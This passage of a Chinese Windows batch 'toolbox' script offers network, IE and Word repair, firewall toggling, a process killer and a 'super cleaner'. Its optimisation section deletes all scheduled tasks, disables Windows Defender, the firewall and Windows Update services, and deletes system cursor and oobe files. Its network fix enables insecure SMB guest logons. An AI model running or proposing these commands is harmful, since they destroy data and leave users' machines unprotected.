regedit /s %temp%\qb42F3508D.09\1.reg
cls
echo 切换成功！当前为“联网、通电”模式
pause
goto tools520

:shuimian2
regedit /s %temp%\qb42F3508D.09\2.reg
cls
echo 切换成功！当前为“断网、断电”模式
pause
goto tools520


:chakanip
cls
echo 此项整理将会花一分钟左右时间，请您耐心等等...
for %%i in (%systemroot%\system32\*.dll) do regsvr32.exe /s %%i
pause
goto tools520

:tanchuguangqu
CLS
mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
cls
Echo 光驱已弹出
pause
goto tools520

:xiufuwangyecuowu
cls
echo   若您按下回车，程序变回开始修复网页，若您按下0，程序会返回工具箱。
set choice=
set /p choice=
if "%choice%"=="0" goto tools520
cls
echo 正在修复，这个过程可能需要几分钟，请稍候…… 
　　rundll32.exe advpack.dll /DelNodeRunDLL32 %systemroot%/System32/dacui.dll 
　　rundll32.exe advpack.dll /DelNodeRunDLL32 %systemroot%/Catroot/icatalog.mdb 
　　regsvr32 /s comcat.dll 
　　regsvr32 /s asctrls.ocx 
　　regsvr32 /s oleaut32.dll 
　　regsvr32 /s shdocvw.dll /I 
　　regsvr32 /s shdocvw.dll 
　　regsvr32 /s browseui.dll 
　　regsvr32 /s browseui.dll /I 
　　regsvr32 /s msrating.dll 
　　regsvr32 /s mlang.dll 
　　regsvr32 /s hlink.dll 
　　regsvr32 /s mshtml.dll 
　　regsvr32 /s mshtmled.dll 
　　regsvr32 /s urlmon.dll 
　　regsvr32 /s plugin.ocx 
　　regsvr32 /s sendmail.dll 
　　regsvr32 /s mshtml.dll /i 
　　regsvr32 /s scrobj.dll 
　　regsvr32 /s corpol.dll 
　　regsvr32 /s jscript.dll 
　　regsvr32 /s msxml.dll 
　　regsvr32 /s imgutil.dll 
　　regsvr32 /s cryptext.dll 
　　regsvr32 /s inseng.dll 
　　regsvr32 /s iesetup.dll /i 
　　regsvr32 /s cryptdlg.dll 
　　regsvr32 /s actxprxy.dll 
　　regsvr32 /s dispex.dll 
　　regsvr32 /s occache.dll 
　　regsvr32 /s iepeers.dll 
　　regsvr32 /s urlmon.dll /i 
　　regsvr32 /s cdfview.dll 
　　regsvr32 /s webcheck.dll 
　　regsvr32 /s mobsync.dll 
　　regsvr32 /s pngfilt.dll 
　　regsvr32 /s licmgr10.dll 
　　regsvr32 /s hhctrl.ocx 
　　regsvr32 /s inetcfg.dll 
　　regsvr32 /s trialoc.dll 
　　regsvr32 /s tdc.ocx 
　　regsvr32 /s MSR2C.DLL 
　　regsvr32 /s msident.dll 
　　regsvr32 /s msieftp.dll 
　　regsvr32 /s xmsconf.ocx 
　　regsvr32 /s ils.dll 
　　regsvr32 /s msoeacct.dll 
　　regsvr32 /s wab32.dll 
　　regsvr32 /s wabimp.dll 
　　regsvr32 /s wabfind.dll 
　　regsvr32 /s oemiglib.dll 
　　regsvr32 /s directdb.dll 
　　regsvr32 /s inetcomm.dll 
　　regsvr32 /s msoe.dll 
　　regsvr32 /s oeimport.dll 
　　regsvr32 /s msdxm.ocx 
　　regsvr32 /s dxmasf.dll 
　　regsvr32 /s laprxy.dll 
　　regsvr32 /s l3codecx.ax 
　　regsvr32 /s acelpdec.ax 
　　regsvr32 /s mpg4ds32.ax 
　　regsvr32 /s danim.dll 
　　regsvr32 /s Daxctle.ocx 
　　regsvr32 /s lmrt.dll 
　　regsvr32 /s datime.dll 
　　regsvr32 /s dxtrans.dll 
　　regsvr32 /s dxtmsft.dll 
　　regsvr32 /s wshom.ocx 
　　regsvr32 /s wshext.dll 
　　regsvr32 /s vbscript.dll 
　　regsvr32 /s scrrun.dll mstinit.exe /setup 
　　regsvr32 /s msnsspc.dll /SspcCreateSspiReg 
　　regsvr32 /s msapsspc.dll /SspcCreateSspiReg 
cls
　　echo 修复成功！任意键返回！ 
　　pause>nul
goto tools520

:winishaguiwd
cls
ECHO 输入你U盘的盘符，然后按回车
set /p pan=
if /i "%pan%"=="C" goto nogeshihua
goto tools520
:nogeshihua
echo 请不要格式化系统盘！！！
PAUSE>NUL
goto tools520
:yesgeshihua
Format %pan%: /x
PAUSE>NUL
goto tools520

:xiufuip
cls
echo -------------------------------------------
echo 按回车后小奥会修复你电脑的部分网络问题。若您按下0，程序会返回工具箱。
set choice=
set /p choice=
if "%choice%"=="0" goto tools520
ECHO 正在注册表...有提示请点确定...
ECHO Windows Registry Editor Version 5.00>>1.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mrxsmb10]>1.reg
ECHO "DisplayName"="@%systemroot%\\system32\\wkssvc.dll,-1004">>1.reg
ECHO "ErrorControl"=dword:00000001>>1.reg
ECHO "Group"="Network">>1.reg
ECHO "ImagePath"=hex(2):73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,44,00,\>>1.reg
ECHO 52,00,49,00,56,00,45,00,52,00,53,00,5c,00,6d,00,72,00,78,00,73,00,6d,00,62,\>>1.reg
ECHO 00,31,00,30,00,2e,00,73,00,79,00,73,00,00,00>>1.reg
ECHO "Start"=dword:00000002>>1.reg
ECHO "Tag"=dword:00000006>>1.reg
ECHO "Type"=dword:00000002>>1.reg
ECHO "Description"="@%systemroot%\\system32\\wkssvc.dll,-1005">>1.reg
ECHO "DependOnService"=hex(7):6d,00,72,00,78,00,73,00,6d,00,62,00,00,00,00,00>>1.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\srv]>>1.reg
ECHO "DisplayName"="@%systemroot%\\system32\\srvsvc.dll,-102">>1.reg
ECHO "ErrorControl"=dword:00000001>>1.reg
ECHO "Group"="Network">>1.reg
ECHO "ImagePath"=hex(2):53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,44,00,\>>1.reg
ECHO 52,00,49,00,56,00,45,00,52,00,53,00,5c,00,73,00,72,00,76,00,2e,00,73,00,79,\>>1.reg
ECHO 00,73,00,00,00>>1.reg
ECHO "Start"=dword:00000002>>1.reg
ECHO "Type"=dword:00000002>>1.reg
ECHO "Description"="@%systemroot%\\system32\\srvsvc.dll,-103">>1.reg
ECHO "DependOnService"=hex(7):73,00,72,00,76,00,32,00,00,00,00,00>>1.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]>>1.reg
ECHO "AllowInsecureGuestAuth"=dword:00000001>>1.reg
regedit /s 1.reg
ping 127.0.0.1 -n 3
del /f /s /q 1.reg
CLS
SC config wuauserv start= auto
SC config bits start= auto
SC config cryptsvc start= auto
SC config trustedinstaller start= auto
SC config wuauserv type=share
net stop wuauserv
net stop cryptSvc
net stop bits
net stop msiserver
ren C:\Windows\SoftwareDistribution SoftwareDistribution.old
net start wuauserv
net start cryptSvc
net start bits
net start msiserver
net stop wuauserv
net stop cryptSvc
net stop bits
net stop msiserver
ren C:\Windows\SoftwareDistribution SoftwareDistribution.old
ren C:\Windows\System32\catroot2 Catroot2.old
rmdir %systemroot%\SoftwareDistribution /S /Q
rmdir %systemroot%\system32\catroot2 /S /Q
net start wuauserv
net start cryptSvc
net start bits
net start msiserver
rem 关闭Windows外壳程序explorer
taskkill /f /im explorer.exe
rem 清理系统图标缓存数据库
attrib -h -s -r "%userprofile%\AppData\Local\IconCache.db"
del /f "%userprofile%\AppData\Local\IconCache.db"
attrib /s /d -h -s -r "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_102.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db"
rem 清理 系统托盘记忆的图标
echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v IconStreams
echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v PastIconsStream
rem 重启Windows外壳程序explorer
start explorer
regsvr32.exe /s atl.dll
regsvr32.exe /s urlmon.dll
regsvr32.exe /s mshtml.dll
regsvr32.exe /s shdocvw.dll
regsvr32.exe /s browseui.dll
regsvr32.exe /s jscript.dll
regsvr32.exe /s vbscript.dll
regsvr32.exe /s scrrun.dll
regsvr32.exe /s msxml3.dll
regsvr32.exe /s msxml6.dll
regsvr32.exe /s actxprxy.dll
regsvr32.exe /s softpub.dll
regsvr32.exe /s wintrust.dll
regsvr32.exe /s dssenh.dll
regsvr32.exe /s rsaenh.dll
regsvr32.exe /s cryptdlg.dll
regsvr32.exe /s oleaut32.dll
regsvr32.exe /s ole32.dll
regsvr32.exe /s shell32.dll
regsvr32.exe /s wuapi.dll
regsvr32.exe /s wuaueng.dll
regsvr32.exe /s wups.dll
regsvr32.exe /s wups2.dll
regsvr32.exe /s qmgr.dll
regsvr32.exe /s wudriver.dll
ipconfig /flushdns
netsh winsock reset
netsh winsock reset proxy
sc start bits
sc start wuauserv
sc start appidsvc
sc start cryptsvc
sc start trustedinstaller
pause
dism/online /cleanup-image /scanhealth
dism/online /cleanup-image /restorehealth
regsvr32 /s Shdocvw.dll 
regsvr32 /s Oleaut32.dll 
regsvr32 /s Actxprxy.dll 
regsvr32 /s Mshtml.dll 
regsvr32 /s Urlmon.dll 
regsvr32 /s Msjava.dll 
regsvr32 /s Browseui.dll 
regsvr32 /s Shell32.dll
ipconfig /release
arp -d *
nbtstat -r
ipconfig /flushdns
nbtstat -rr
ipconfig /registerdns
net start
cls
netsh winsock reset
netsh winsock reset catalog
echo 按回车后小奥会重启您的电脑。
echo. & pause
shutdown -r -t 0
exit

:xiufuie
cls
echo -------------------------------------------
Echo     小奥即将修复您的IE，在此之前给您温馨提示：
Echo     为了以防万一，请将电脑静音。
echo   若您按下回车，程序变回开始修复网页，若您按下0，程序会返回工具箱。
set choice=
set /p choice=
if "%choice%"=="0" goto tools520
Echo %Date% %Time% 启动修复 IE... 

cls
rundll32.exe advpack.dll /DelNodeRunDLL32 C:\WINNT\System32\dacui.dll 
cls
Echo %Date% %Time% 进度已完成 1/101... 
rundll32.exe advpack.dll /DelNodeRunDLL32 C:\WINNT\Catroot\icatalog.mdb
cls 
Echo %Date% %Time% 进度已完成 2/101... 
regsvr32 setupwbv.dll /s 

cls
Echo %Date% %Time% 进度已完成 3/101... 
regsvr32 wininet.dll /s 
cls
Echo %Date% %Time% 进度已完成 4/101... 
regsvr32 comcat.dll /s 
cls
Echo %Date% %Time% 进度已完成 5/101... 
regsvr32 shdoc401.dll /s 
cls
Echo %Date% %Time% 进度已完成 6/101... 
regsvr32 shdoc401.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 7/101... 
regsvr32 asctrls.ocx /s 
cls
Echo %Date% %Time% 进度已完成 8/101... 
regsvr32 oleaut32.dll /s 
cls
Echo %Date% %Time% 进度已完成 9/101... 
regsvr32 shdocvw.dll /I /s 
cls
Echo %Date% %Time% 进度已完成 10/101... 
regsvr32 shdocvw.dll /s 
cls
Echo %Date% %Time% 进度已完成 11/101... 
regsvr32 browseui.dll /s 
cls
Echo %Date% %Time% 进度已完成 12/101... 
regsvr32 browseui.dll /I /s 
cls
Echo %Date% %Time% 进度已完成 13/101... 
regsvr32 msrating.dll /s 
cls
Echo %Date% %Time% 进度已完成 14/101... 
regsvr32 mlang.dll /s 
cls
Echo %Date% %Time% 进度已完成 15/101... 
regsvr32 hlink.dll /s 
cls
Echo %Date% %Time% 进度已完成 16/101... 
regsvr32 mshtml.dll /s 
cls
Echo %Date% %Time% 进度已完成 17/101... 
regsvr32 mshtmled.dll /s 
cls
Echo %Date% %Time% 进度已完成 18/101... 
regsvr32 urlmon.dll /s 
cls
Echo %Date% %Time% 进度已完成 19/101... 
regsvr32 plugin.ocx /s 
cls
Echo %Date% %Time% 进度已完成 20/101... 
regsvr32 sendmail.dll /s 
cls
Echo %Date% %Time% 进度已完成 21/101... 
regsvr32 comctl32.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 22/101... 
regsvr32 inetcpl.cpl /i /s 
cls
Echo %Date% %Time% 进度已完成 23/101... 
regsvr32 mshtml.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 24/101... 
regsvr32 scrobj.dll /s 
cls
Echo %Date% %Time% 进度已完成 25/101... 
regsvr32 mmefxe.ocx /s 
cls
Echo %Date% %Time% 进度已完成 26/101... 
regsvr32 proctexe.ocx /s 
cls
Echo %Date% %Time% 进度已完成 27/101... 
mshta.exe /register 
cls
Echo %Date% %Time% 进度已完成 28/101... 
regsvr32 corpol.dll /s 
cls
Echo %Date% %Time% 进度已完成 29/101... 
regsvr32 jscript.dll /s 
cls
Echo %Date% %Time% 进度已完成 30/101... 
regsvr32 msxml.dll /s 
cls
Echo %Date% %Time% 进度已完成 31/101... 
regsvr32 imgutil.dll /s 
cls
Echo %Date% %Time% 进度已完成 32/101... 
regsvr32 thumbvw.dll /s 
cls
Echo %Date% %Time% 进度已完成 33/101... 
regsvr32 cryptext.dll /s 
cls
Echo %Date% %Time% 进度已完成 34/101... 
regsvr32 rsabase.dll /s 
cls
Echo %Date% %Time% 进度已完成 35/101... 
regsvr32 triedit.dll /s 
cls
Echo %Date% %Time% 进度已完成 36/101... 
regsvr32 dhtmled.ocx /s 
cls
Echo %Date% %Time% 进度已完成 37/101... 
regsvr32 inseng.dll /s 
cls
Echo %Date% %Time% 进度已完成 38/101... 
regsvr32 iesetup.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 39/101... 
regsvr32 hmmapi.dll /s 
cls
Echo %Date% %Time% 进度已完成 40/101... 
regsvr32 cryptdlg.dll /s 
cls
Echo %Date% %Time% 进度已完成 41/101... 
regsvr32 actxprxy.dll /s 
cls
Echo %Date% %Time% 进度已完成 42/101... 
regsvr32 dispex.dll /s 
cls
Echo %Date% %Time% 进度已完成 43/101... 
regsvr32 occache.dll /s 
cls
Echo %Date% %Time% 进度已完成 44/101... 
regsvr32 occache.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 45/101... 
regsvr32 iepeers.dll /s 
cls
Echo %Date% %Time% 进度已完成 46/101... 
regsvr32 wininet.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 47/101... 
regsvr32 urlmon.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 48/101... 
regsvr32 digest.dll /i /s 
cls
Echo %Date% %Time% 进度已完成 49/101... 
regsvr32 cdfview.dll /s 
cls
Echo %Date% %Time% 进度已完成 50/101... 
regsvr32 webcheck.dll /s 
cls
Echo %Date% %Time% 进度已完成 51/101... 
regsvr32 mobsync.dll /s 
cls
Echo %Date% %Time% 进度已完成 52/101... 
regsvr32 pngfilt.dll /s 
cls
Echo %Date% %Time% 进度已完成 53/101... 
regsvr32 licmgr10.dll /s 
cls
Echo %Date% %Time% 进度已完成 54/101... 
regsvr32 icmfilter.dll /s 
cls
Echo %Date% %Time% 进度已完成 55/101... 
regsvr32 hhctrl.ocx /s 
cls
Echo %Date% %Time% 进度已完成 56/101... 
regsvr32 inetcfg.dll /s 
cls
Echo %Date% %Time% 进度已完成 57/101... 
regsvr32 trialoc.dll /s 
cls
Echo %Date% %Time% 进度已完成 58/101... 
regsvr32 tdc.ocx /s 
cls
Echo %Date% %Time% 进度已完成 59/101... 
regsvr32 MSR2C.DLL /s 
cls
Echo %Date% %Time% 进度已完成 60/101... 
regsvr32 msident.dll /s 
cls
Echo %Date% %Time% 进度已完成 61/101... 
regsvr32 msieftp.dll /s 
cls
Echo %Date% %Time% 进度已完成 62/101... 
regsvr32 xmsconf.ocx /s 
cls
Echo %Date% %Time% 进度已完成 63/101... 
regsvr32 ils.dll /s 
cls
Echo %Date% %Time% 进度已完成 64/101... 
regsvr32 msoeacct.dll /s 
cls
Echo %Date% %Time% 进度已完成 65/101... 
regsvr32 wab32.dll /s 
cls
Echo %Date% %Time% 进度已完成 66/101... 
regsvr32 wabimp.dll /s 
cls
Echo %Date% %Time% 进度已完成 67/101... 
regsvr32 wabfind.dll /s 
cls
Echo %Date% %Time% 进度已完成 68/101... 
regsvr32 oemiglib.dll /s 
cls
Echo %Date% %Time% 进度已完成 69/101... 
regsvr32 directdb.dll /s 
cls
Echo %Date% %Time% 进度已完成 70/101... 
regsvr32 inetcomm.dll /s 
cls
Echo %Date% %Time% 进度已完成 71/101... 
regsvr32 msoe.dll /s 
cls
Echo %Date% %Time% 进度已完成 72/101... 
regsvr32 oeimport.dll /s 
cls
Echo %Date% %Time% 进度已完成 73/101... 
regsvr32 msdxm.ocx /s 
cls
Echo %Date% %Time% 进度已完成 74/101... 
regsvr32 dxmasf.dll /s 
cls
Echo %Date% %Time% 进度已完成 75/101... 
regsvr32 laprxy.dll /s 
cls
Echo %Date% %Time% 进度已完成 76/101... 
regsvr32 l3codecx.ax /s 
cls
Echo %Date% %Time% 进度已完成 77/101... 
regsvr32 acelpdec.ax /s 
cls
Echo %Date% %Time% 进度已完成 78/101... 
regsvr32 mpg4ds32.ax /s 
cls
Echo %Date% %Time% 进度已完成 79/101... 
regsvr32 voxmsdec.ax /s 
cls
Echo %Date% %Time% 进度已完成 80/101... 
regsvr32 danim.dll /s 
cls
Echo %Date% %Time% 进度已完成 81/101... 
regsvr32 Daxctle.ocx /s 
cls
Echo %Date% %Time% 进度已完成 82/101... 
regsvr32 lmrt.dll /s 
cls
Echo %Date% %Time% 进度已完成 83/101... 
regsvr32 datime.dll /s 
cls
Echo %Date% %Time% 进度已完成 84/101... 
regsvr32 dxtrans.dll /s 
cls
Echo %Date% %Time% 进度已完成 85/101... 
regsvr32 dxtmsft.dll /s 
cls
Echo %Date% %Time% 进度已完成 86/101... 
regsvr32 vgx.dll /s 
cls
Echo %Date% %Time% 进度已完成 87/101... 
regsvr32 WEBPOST.DLL /s 
cls
Echo %Date% %Time% 进度已完成 88/101... 
regsvr32 WPWIZDLL.DLL /s 
cls
Echo %Date% %Time% 进度已完成 89/101... 
regsvr32 POSTWPP.DLL /s 
cls
Echo %Date% %Time% 进度已完成 90/101... 
regsvr32 CRSWPP.DLL /s 
cls
Echo %Date% %Time% 进度已完成 91/101... 
regsvr32 FTPWPP.DLL /s 
cls
Echo %Date% %Time% 进度已完成 92/101... 
regsvr32 FPWPP.DLL /s 
cls
Echo %Date% %Time% 进度已完成 93/101... 
regsvr32 FLUPL.OCX /s 
cls
Echo %Date% %Time% 进度已完成 94/101... 
regsvr32 wshom.ocx /s 
cls
Echo %Date% %Time% 进度已完成 95/101... 
regsvr32 wshext.dll /s 
cls
Echo %Date% %Time% 进度已完成 96/101... 
regsvr32 vbscript.dll /s 
cls
Echo %Date% %Time% 进度已完成 97/101... 
regsvr32 scrrun.dll /s 
cls
Echo %Date% %Time% 进度已完成 98/101... 
mstinit.exe /setup /s 
cls
Echo %Date% %Time% 进度已完成 99/101... 
regsvr32 msnsspc.dll /SspcCreateSspiReg /s 
cls
Echo %Date% %Time% 进度已完成 100/101... 
regsvr32 msapsspc.dll /SspcCreateSspiReg /s 
cls
Echo %Date% %Time% 进度已完成 101/101... 
cls
echo %Date% %Time%
echo 安全起见，正在启动第二次修复...
　　regsvr32 /s actxprxy.dll 
　　regsvr32 /s shdocvw.dll 
　　Regsvr32 /s URLMON.DLL 
　　Regsvr32 /s actxprxy.dll 
　　Regsvr32 /s shdocvw.dll 
　　regsvr32 /s oleaut32.dll 
　　rundll32.exe /s advpack.dll /DelNodeRunDLL32 C:\WINNT\System32\dacui.dll 
　　rundll32.exe /s advpack.dll /DelNodeRunDLL32 C:\WINNT\Catroot\icatalog.mdb 
　　regsvr32 /s setupwbv.dll 
cls
echo 完成百分之 10
　　regsvr32 /s wininet.dll 
　　regsvr32 /s comcat.dll 
　　regsvr32 /s shdoc401.dll 
　　regsvr32 /s shdoc401.dll /i 
　　regsvr32 /s asctrls.ocx 
　　regsvr32 /s oleaut32.dll 
　　regsvr32 /s shdocvw.dll /I 
　　regsvr32 /s shdocvw.dll 
cls
echo 完成百分之 15
　　regsvr32 /s browseui.dll 
　　regsvr32 /s browseui.dll /I 
　　regsvr32 /s msrating.dll 
　　regsvr32 /s mlang.dll 
　　regsvr32 /s hlink.dll 
　　regsvr32 /s mshtml.dll 
　　regsvr32 /s mshtmled.dll 
　　regsvr32 /s urlmon.dll 
　　regsvr32 /s plugin.ocx 
cls
echo 完成百分之 20
　　regsvr32 /s sendmail.dll 
　　regsvr32 /s comctl32.dll /i 
　　regsvr32 /s inetcpl.cpl /i 
　　regsvr32 /s mshtml.dll /i 
　　regsvr32 /s scrobj.dll 
　　regsvr32 /s mmefxe.ocx 
　　regsvr32 /s proctexe.ocx mshta.exe /register 
　　regsvr32 /s corpol.dll 
　　regsvr32 /s jscript.dll 
　　regsvr32 /s msxml.dll 
cls
echo 完成百分之 25
　　regsvr32 /s imgutil.dll 
　　regsvr32 /s thumbvw.dll 
　　regsvr32 /s cryptext.dll 
　　regsvr32 /s rsabase.dll 
　　regsvr32 /s triedit.dll 
　　regsvr32 /s dhtmled.ocx 
　　regsvr32 /s inseng.dll 
cls
echo 完成百分之 30
　　regsvr32 /s iesetup.dll /i 
　　regsvr32 /s hmmapi.dll 
　　regsvr32 /s cryptdlg.dll 
　　regsvr32 /s actxprxy.dll 
　　regsvr32 /s dispex.dll 
　　regsvr32 /s occache.dll 
　　regsvr32 /s occache.dll /i 
　　regsvr32 /s iepeers.dll 
cls
echo 完成百分之 40
　　regsvr32 /s wininet.dll /i 
　　regsvr32 /s urlmon.dll /i 
　　regsvr32 /s digest.dll /i 
　　regsvr32 /s cdfview.dll 
　　regsvr32 /s webcheck.dll 
cls
echo 完成百分之 50
　　regsvr32 /s mobsync.dll 
　　regsvr32 /s pngfilt.dll 
　　regsvr32 /s licmgr10.dll 
　　regsvr32 /s icmfilter.dll 
　　regsvr32 /s hhctrl.ocx 
　　regsvr32 /s inetcfg.dll 
　　regsvr32 /s trialoc.dll 
　　regsvr32 /s tdc.ocx 
　　regsvr32 /s MSR2C.DLL 
　　regsvr32 /s msident.dll 
　　regsvr32 /s msieftp.dll 
cls
echo 完成百分之 60
　　regsvr32 /s xmsconf.ocx 
　　regsvr32 /s ils.dll 
　　regsvr32 /s msoeacct.dll 
　　regsvr32 /s wab32.dll 
　　regsvr32 /s wabimp.dll
cls
echo 完成百分之 70
　　regsvr32 /s wabfind.dll 
　　regsvr32 /s oemiglib.dll 
　　regsvr32 /s directdb.dll 
　　regsvr32 /s inetcomm.dll 
　　regsvr32 /s msoe.dll 
　　regsvr32 /s oeimport.dll 
　　regsvr32 /s msdxm.ocx 
cls
echo 完成百分之 80
　　regsvr32 /s dxmasf.dll 
　　regsvr32 /s laprxy.dll 
　　regsvr32 /s l3codecx.ax 
　　regsvr32 /s acelpdec.ax 
　　regsvr32 /s mpg4ds32.ax 
　　regsvr32 /s voxmsdec.ax 
　　regsvr32 /s danim.dll 
　　regsvr32 /s Daxctle.ocx 
　　regsvr32 /s lmrt.dll 
　　regsvr32 /s datime.dll 
　　regsvr32 /s dxtrans.dll 
　　regsvr32 /s dxtmsft.dll 
　　regsvr32 /s vgx.dll 
cls
echo 完成百分之 90
　　regsvr32 /s WEBPOST.DLL 
　　regsvr32 /s WPWIZDLL.DLL 
　　regsvr32 /s POSTWPP.DLL 
　　regsvr32 /s CRSWPP.DLL 
　　regsvr32 /s FTPWPP.DLL 
　　regsvr32 /s FPWPP.DLL 
　　regsvr32 /s FLUPL.OCX 
　　regsvr32 /s wshom.ocx 
　　regsvr32 /s wshext.dll 
　　regsvr32 /s vbscript.dll 
　　regsvr32 /s scrrun.dll mstinit.exe /setup 
　　regsvr32 /s msnsspc.dll /SspcCreateSspiReg 
　　regsvr32 /s msapsspc.dll /SspcCreateSspiReg
cls 
echo 完成百分之 100
cls
Echo IE 修复完毕 
cls
Echo 小奥已成功将IE修复！
pause
goto tools520


:fanghuoqiang
cls
echo         设置防火墙
echo       输入1关闭防火墙
echo       输入2开启防火墙
echo       输入3重置防火墙
echo      按回车返回工具箱
set choice= 
set /p choice=请输入回应：
if "%choice%"=="" goto tools520
if "%choice%"=="1" goto guanbifanghuoqiang
if "%choice%"=="2" goto kaiqifanghuoqiang
if "%choice%"=="3" goto chongzhifanghuoqiang
:kaiqifanghuoqiang
netsh firewall set opmode mode = enable
goto tools520
:guanbifanghuoqiang
netsh firewall set opmode mode = disable
goto tools520
:chongzhifanghuoqiang
netsh advfirewall reset
goto tools520


:jincheng
title 微型任务管理器
mode con cols=70 lines=70
cls
set space= 
:start
cls
set num=0
for /f "skip=4" %%i in ('tasklist') do (set /a num+=1&set task!num!=%%i&set str=!num!-----&set str=!str:~0,6!&set str=!str!%%i!space!&set str=!str:~0,30!&set echo=!echo!!str!&set /a flag+=1&if !flag!==2 (echo !echo!&set flag=0&set echo=))
if not "%echo%"=="" echo !echo!
set echo=&set flag=
set /p choose=请选择一个要杀的进程:
call taskkill /im %%task%choose%%% /f
pause
goto tools520


:wordxiufu
cls
echo    注意：请先关闭所有Word文档程序，然后按任意键开始修复......
echo 若您按下回车，则会开始修复，若您按下0，程序会返回工具箱。
set choice=
set /p choice=
if "%choice%"=="0" goto tools520
del /f /s /q "%userprofile%\local settings\temp\*.*"
del /f /s /q "%appdata%\microsoft\Templates\*.dot"
del /f /s /q "%appdata%\microsoft\Word\Startup\*.dot"
cls
echo 修复成功！
echo 如果仍有问题，请手动点击“开始”—“运行”“regsvr32 /u /s pintlgnt.ime”命令。
pause
goto tools520


:Taskkill
cls
echo -------------------------------------------
echo ------------欢迎使用极力清理器-------------
echo -------------------------------------------
echo ● 警告！超级清理可能会导致您的个性化设置失效，如不是特殊需要请勿使用本选项！
echo ● 重要文件一定要事先做好备份，如您的文件故意放在了缓存清理位置，被程序误删后本人及程序不承担任何责任！
echo ● 决定好后请按动回车。
echo ● 运行前请尽最大可能关闭正在使用中的软件，否则可能会导致程序卡住。
echo ● 若出现卡住现象推荐进行重启操作。
echo -------------------------------------------
pause
echo 正在清理个性化项目...
start %windir%\explorer.exe
Del /a/f/s/q "%WinDir%\Cursors\*.*"
Del /a/f/s/q "%SysDir%\oobe\*.*"
cls
echo Win10优化
powercfg -h off
SCHTASKS /Delete /TN * /F
for %%a in (EventSystem CoreMessagingRegistrar CryptSvc DcomLaunch gpsvc LSM Power RpcSs RpcEptMapper SamSs ShellHWDetection sppsvc SENS SystemEventsBroker Schedule Themes tiledatamodelsvc UserManager ProfSvc Audiosrv AudioEndpointBuilder Wcmsvc EventLog Winmgmt WlanSvc knbcenter KSafeSvc Dnscache) do sc config %%a start= auto
for %%a in (AxInstSV AJRouter AppReadiness AppIDSvc Appinfo PeerDistSvc KeyIso COMSysApp VaultSvc DsSvc DcpSvc DeviceAssociationService DeviceInstall DsmSvc DevQueryBroker MSDTC EFS EntAppSvc EapHost fhsvc HvHost vmickvpexchange vmicguestinterface vmicshutdown vmicheartbeat vmicvmsession vmictimesync vmicvss vmicrdv IKEEXT KtmRm lltdsvc wlidsvc NgcSvc NgcCtnrSvc smphost SmsRouter NcdAutoSetup Netman NcaSvc netprofm NlaSvc NetSetupSvc nsi PerfHost pla PhoneSvc PlugPlay PNRPAutoReg RasAuto RasMan SessionEnv TermService UmRdpService RpcLocator SstpSvc SensorDataService SensrSvc SensorService ScDeviceEnum SCPolicySvc SNMPTRAP svsvc SSDPSRV StateRepository WiaRpc StorSvc TieringEngineService TapiSrv TimeBrokerSvc TabletInputService UsoSvc upnphost UserDataSvc UnistoreSvc vds VSS WalletService FrameServer wcncsvc wudfsvc WEPHOSTSVC WerSvc Wecsvc msiserver WMPNetworkSvc WinRM SDRSVC WpnUserService LicenseManager icssvc wisvc dot3svc wmiApSrv workfolderssvc XblAuthManager XboxNetApiSvc XblGameSave bthserv CDPSvc RetailDemo embeddedmode DmEnrollmentSvc RmSvc Dhcp QPCore) do sc config %%a start= demand
for %%a in (ALG AppMgmt AppXSvc BITS BrokerInfrastructure BDESVC wbengine BthHFSrv CertPropSvc ClipSVC Browser DiagTrack PimIndexMaintenanceSvc DoSvc DPS WdiServiceHost WdiSystemHost TrkWks dmwappushservice Fax fdPHost FDResPub HomeGroupListener HomeGroupProvider hidserv irmon UI0Detect SharedAccess iphlpsvc PolicyAgent KugouService MessagingService diagnosticshub.standardcollector.service AppVClient MSiSCSI swprv NetTcpPortSharing Netlogon NcbService CscService defragsvc pcmastersvc PNRPsvc p2psvc p2pimsvc WPDBusEnum Spooler PrintNotify wercplsupport QWAVE RemoteRegistry RemoteAccess seclogon wscsvc LanmanServer shpamsvc SCardSvr lmhosts UevAgentService WebClient WbioSrvc Sense WdNisSvc WinDefend FontCache stisvc TrustedInstaller WSearch W32Time wuauserv WpnService WinHttpAutoProxySvc LanmanWorkstation WwanSvc OneSyncSvc tzautoupdate NVDisplay.ContainerLocalSystem PcaSvc SysMain XLNXService XLServicePlatform "Flash Helper Service" khealth_service BFE MpsSvc MapsBroker lfsvc NvContainerLocalSystem NvContainerNetworkService NvTelemetryContainer SogouSvc) do sc config %%a start= disabled
goto jiliqingli


:delVM
cls
echo -------------------------------------------
echo 请注意！本程序是需要您在卸载完VMware或者卸载失败
echo 再或者卸载成功但无法再次安装的情况下使用的！
echo 如果出现任何提示请点击“确认”！
echo -------------------------------------------
echo 按任意键开始卸载VMware.....
pause
net stop VMAuthdService
net stop VMnetDHCP
net stop "VMware NAT Service"
